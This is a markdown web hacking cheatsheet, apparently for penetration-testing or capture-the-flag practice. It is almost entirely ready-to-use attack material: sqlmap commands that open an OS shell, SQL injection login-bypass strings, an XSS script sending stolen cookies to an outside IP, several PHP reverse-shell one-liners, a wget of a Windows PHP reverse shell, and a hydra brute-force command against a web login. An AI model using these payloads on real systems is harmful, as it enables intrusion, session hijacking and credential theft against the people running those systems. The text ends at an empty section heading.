# Web Hacking Cheatsheet

<!--
##################################################################
##################################################################
-->

## Enumeration

### Directory Scan Using Gobuster

`gobuster dir -w /usr/share/seclists/Discovery/Web-Content/name of list -u http://targetURL`

### cURL

#### Links

[Everything curl](https://everything.curl.dev/)

#### GET Request

`curl http://targetURL`

#### GET Request Save Cookie

`curl -c /tmp/cookies http://targetURL`

#### GET Request with Cookie

`curl -b 'cookiename=cookievalue' https://google.com`

#### POST Request

`curl -X POST --data randomdata http://targetURL`

#### File Upload

`curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS`

<!--
##################################################################
##################################################################
-->

## SQLI

### Test for SQLI with SQLMAP Using Cookie

`sqlmap -u 'http://website.address?field=to-test' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls"`

### Use SQLMAP to Get Shell

`sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=802vjt3crnju4eg3ib0q04ge9v" --os-shell`

### Bypass Authentication with SQL Injection

`' or 1=1 --`

`a' or 1=1 --`

`" or 1=1 --`

`a" or 1=1 --`

`' or 1=1 #`

`" or 1=1 #`

`or 1=1 --`

`' or 'x'='x`

`" or "x"="x`

`') or ('x'='x`

`") or ("x"="x`

<!--
##################################################################
##################################################################
-->

## XSS

### Test for XSS

`Hello!<script>alert("Welcome");</script>`

### XSS Cookie Hijacking

_Start XSS-cookie-stealer.py \*\*\*https://raw.githubusercontent.com/lnxg33k/misc/master/XSS-cookie-stealer.py_

_\*\*https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md_

```
<script>
alert(document.cookie);
var i=new Image;
i.src="http://172.30.10.210:8888/?"+document.cookie;
</script>
```

<!--
##################################################################
##################################################################
-->

## [SQLite](https://www.sqlitetutorial.net/sqlite-commands/)

### Access Database

`sqlite3 databasename.db`

### Show Tables

`.tables`

### Show Table Info

`PRAGMA table_info(tablename);`
`.schema tablename`

### Dump Info From Table

`SELECT * FROM customers;`
`.dump tablename`

<!--
##################################################################
##################################################################
-->

## Shells

### PHP

`php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'`

`php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'`

`php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`

### Windows PHP Reverse Shell

`wget https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php`

<!--
##################################################################
##################################################################
-->

## Brute Forcing

### Web Login

`hydra -L /home/n0m4d1k/usernames -P /usr/share/wordlists/rockyou.txt -t 16 172.30.73.80 http-post-form "/login.php:username=^USER^&password=^PASS^&action=Login:Incorrect username or password"`

<!--
##################################################################
##################################################################
-->

## Useful Commands
